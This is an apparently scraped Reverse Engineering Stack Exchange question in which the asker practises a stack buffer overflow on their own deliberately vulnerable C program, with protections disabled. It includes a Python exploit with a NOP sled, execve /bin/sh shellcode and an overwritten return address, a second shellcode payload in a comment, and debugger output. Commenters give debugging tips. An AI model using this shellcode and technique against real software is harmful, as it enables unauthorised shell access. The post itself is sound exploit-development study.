{
    "title": "Illegal instruction fault in stack based buffer overflow",
    "link": "https://reverseengineering.stackexchange.com/questions/21077/illegal-instruction-fault-in-stack-based-buffer-overflow",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I wrote this short C program to practice buffer overflow exploits:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stddef.h&gt;\n#include &lt;inttypes.h&gt;\n\nchar *decode(char *s){\n  for(int i = 0; i &lt; strlen(s); i++){\n    s[i] ^= 0x15;\n  }\n  return s;\n}\n\nvoid get_secret(int argc, char *argv[]){\n\n  uint32_t eip_addr;\n  char secret[] = \"}aaef/::lz`a`;wp:qDb!b,BrMvD\";\n  char buffer[100];\n\n  if(argc &gt; 1){\n    strcpy(buffer, argv[1]);\n  }else{\n    scanf(\"%s\", buffer);\n  }\n\n  printf(\"You entered: %s\\n\\n\", buffer);\n\n  if(strcmp(buffer, secret) == 0){\n    printf(\"Passwords match!\\n\");\n    printf(\"Here is the secret message: %s\\n\", decode(secret));\n  }else{\n    printf(\"Get the f!@# out of here!\\n\");\n    asm volatile(\"1: lea 1b, %0;\": \"=a\"(eip_addr));\n    printf(\"EIP address:  %\" PRIx32 \"; %\" PRIu32 \" bytes from main start\\n\",\n       eip_addr,eip_addr - (uint32_t)get_secret);\n  }\n}\nint main(int argc, char *argv[]){  \n  printf(\"Welcome to the simple verifier!\\n\");\n  printf(\"Please enter your password: \");\n\n  get_secret(argc, argv);\n\n  return 0;\n}\n</code></pre>\n<p>I disable <code>ASLR</code> and compile it with <code>NX</code>, <code>PIE</code>, and <code>CANARY</code> disabled:</p>\n<pre><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space\ngcc -m32 -g -no-pie -fno-stack-protector -z execstack overflow.c -o overflow\n</code></pre>\n<p>Using <code>r2</code>, <code>ragg2</code> and <code>rarun2</code>, I find where I can overwrite the return address of <code>get_secret()</code>:</p>\n<pre><code>~$ ragg2 -P 200 -r &gt; pattern.txt\n~$ echo \"#!/usr/bin/rarun2\" &gt; profile.rr2 &amp;&amp; echo \"stdin=./pattern.txt\" &gt;&gt; profile.rr2\n~$ r2 -r profile.rr2 -d overflow\n[0xf7795a20]&gt; dc\nEIP address:  804930b; 257 bytes from main start\nchild stopped with signal 11\n[+] SIGNAL 11 errno=0 addr=0x41784141 code=1 ret=0\n[0x41784141]&gt; wopO 0x41784141\n145\n[0x41784141]&gt; \n</code></pre>\n<p>So, now I know exactly how big my payload must be to get to the return address, 145 bytes. Now I find an address to point to on the stack using <code>gdb</code>:</p>\n<pre><code>~$ gdb overflow_exe -q\ngdb-peda$ b 20\ngdb-peda$ b 25\ngdb-peda$ r $(python -c 'print \"A\"*145+\"B\"*4')\ngdb-peda$ c\ngdb-peda$ x/200x $esp\n0xffffd100: 0x39    0x25    0xfe    0xf7    0x00    0x00    0x00    0x00\n0xffffd108: 0x7d    0xc5    0xe5    0x41    0x41    0x41    0x41    0x41\n0xffffd110: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd118: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd120: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd128: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd130: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd138: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd140: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd148: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd150: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd158: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd160: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd168: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd170: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd178: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd180: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd188: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd190: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd198: 0x41    0x41    0x41    0x41    0x42    0x42    0x42    0x42\n0xffffd1a0: 0x00    0x00    0x00    0x00    0x74    0xd2    0xff    0xff\n0xffffd1a8: 0x80    0x28    0xe2    0xf7    0x55    0x93    0x04    0x08\n0xffffd1b0: 0x02    0x00    0x00    0x00    0x74    0xd2    0xff    0xff\n0xffffd1b8: 0x80    0xd2    0xff    0xff    0xe0    0xd1    0xff    0xff\n0xffffd1c0: 0x00    0x00    0x00    0x00    0x02    0x00    0x00    0x00\ngdb-peda$\n</code></pre>\n<p>I <em>should</em> be able to replace those <code>\\x41</code>s with <code>\\x90</code>s, append my shellcode to it, then some address on the stack on to the end of that, making my payload look something like this:</p>\n<pre><code>\"\\x90\"*117 + &lt;/bin/sh shellcode&gt; + &lt;some address that's filled with \\x90&gt;\n</code></pre>\n<p>Using this logic, I picked an address in the middle on the NOPs, <code>0xffffd150</code>, and crafted the following python exploit:</p>\n<pre><code>#!/usr/bin/env python\nimport struct, os\n\n#land in middle of NOPs\nret_addr = 0xffffd150\n\n#shellcode -&gt; 28 bytes\nshell_code = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\n\n#correct endianess\ndef conv(val):\n    return struct.pack('&lt;I', val)\n\n# Build the exploit string\n# 149 bytes to overwrite the ret addr total\n# Need to take 28 bytes for the shellcode and 4 for the return addr\n# 145 - 28 = 117\nexp = \"\\x90\"*117\nexp += shell_code # at the ret addr (145 bytes) here\nexp += conv(ret_addr)\n\nprint(\"Starting exploit\")\nos.system(\"./overflow_exe \"+exp)\n</code></pre>\n<p>But...I keep getting an <em>Illegal instruction</em> fault:</p>\n<pre><code>~$ ./overflow_exploit.py \nStarting exploit\nWelcome to the simple verifier!\nPlease enter your password: You entered: ���������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin�����°\n                 1�@̀P���\n\nGet the f!@# out of here!\nEIP address:  804930b; 257 bytes from main start\nIllegal instruction\n</code></pre>\n<p>Back in <code>gdb</code> I can see the NOP sled, shellcode, and return address, all where they should be:</p>\n<pre><code>gdb-peda$ x/200x $esp\n0xffffd120: 0xf7fe2539  0x00000000  0x90e5c57d  0x90909090\n0xffffd130: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd140: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd150: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd160: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd170: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd180: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd190: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd1a0: 0x6850c031  0x68732f2f  0x69622f68  0x89e3896e\n0xffffd1b0: 0xb0c289c1  0x3180cd0b  0x80cd40c0  0xffffd150\n</code></pre>\n<p>I'm at a loss.  I re-check the binary's security features, and NX is still disabled (which is the only reason I can think of to explain the shellcode eliciting an \"Illegal instruction\" fault):</p>\n<pre><code>gdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : disabled\nPIE       : disabled\nRELRO     : Partial\ngdb-peda$ \n</code></pre>\n<p>Why is my exploit throwing an <code>Illegal instruction</code> fault when all security features are disabled, and my shellcode is in the correct position on the stack?</p>\n<p>I'm on Debian 9</p>\n</div>",
    "votes": "1",
    "answers": 0,
    "views": "841",
    "tags": [
        "radare2",
        "c",
        "gdb",
        "python",
        "buffer-overflow"
    ],
    "user": "corporateWhore",
    "time": "Apr 15, 2019 at 0:24",
    "comments": [
        {
            "user": "perror",
            "text": "<span class=\"comment-copy\">Try to step instruction by instruction through <code>gdb</code> with the <code>si</code> (<code>stepi</code>) command. You will get a more accurate information about what does cause the problem. Also, use <code>layout next</code> a few time until you get the assembly displayed.</span>",
            "time": null
        },
        {
            "user": "sudhackar",
            "text": "<span class=\"comment-copy\">You can turn on core dumps and analyze where your return address lands. Stack addresses are not same when you run a binary under gdb and without it.</span>",
            "time": null
        },
        {
            "user": "corporateWhore",
            "text": "<span class=\"comment-copy\">Following <a href=\"https://stackoverflow.com/a/17775966/4678883\">stackoverflow.com/a/17775966/4678883</a> managed to get the correct stack address (which was in fact different).  My shellcode executes but for some reason instead of spawning a shell, it interprets the remaining stack contents as a shell command. So if this is my argument:  <code>$(python -c 'print \"\\x90\"*65 + \"\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\"+\"A\"*50+\"\\x50\\xdc\\xff\\xff\"')</code>, I get <code>sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���: not found</code></span>",
            "time": null
        },
        {
            "user": "Caroline",
            "text": "<span class=\"comment-copy\">What architecture are you running on ? Is it x86 or x86_64 ?  If your running your shellcode on an x86_64 processor, the first instruction are : <code>XOR        EAX, EAX PUSH       RAX</code> instead of (on x86_32) <code>XOR        EAX, EAX PUSH       EAX</code></span>",
            "time": null
        },
        {
            "user": "corporateWhore",
            "text": "<span class=\"comment-copy\">I'm running X86_64 but the program was compiled as X86.</span>",
            "time": null
        }
    ],
    "answers_data": []
}